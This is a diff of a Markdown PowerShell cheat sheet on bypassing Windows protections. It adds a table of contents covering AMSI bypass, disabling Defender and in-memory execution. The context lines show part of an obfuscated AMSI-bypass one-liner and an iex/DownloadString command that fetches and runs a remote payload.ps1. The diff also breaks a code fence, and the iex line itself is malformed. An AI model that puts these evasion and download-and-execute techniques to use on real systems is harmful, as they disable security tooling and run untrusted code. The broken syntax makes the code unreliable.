@@ -1,3 +1,13 @@
+- [Tricks to Bypass protections](#tricks-to-bypass-protections)
+  * [Execution Policy Protection](#execution-policy-protection)
+  * [AMSI Bypass](#amsi-bypass)
+  * [Memory Execution](#memory-execution)
+  * [Disable Defender](#disable-defender)
+  * [Invisi Shell](#invisi-shell)
+  * [AMSI Trigger](#amsi-trigger)
+  * [References](#references)
+
+
 ## Tricks to Bypass protections
 
 ### Execution Policy Protection
@@ -21,7 +31,7 @@ C:> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F'
 ```
 ### Memory Execution
 ---
-```powershell
+```powershell``
 C:> iex New Object Net.WebClient DownloadString('https://webserver/payload.ps1')
 ```
 ```powershell
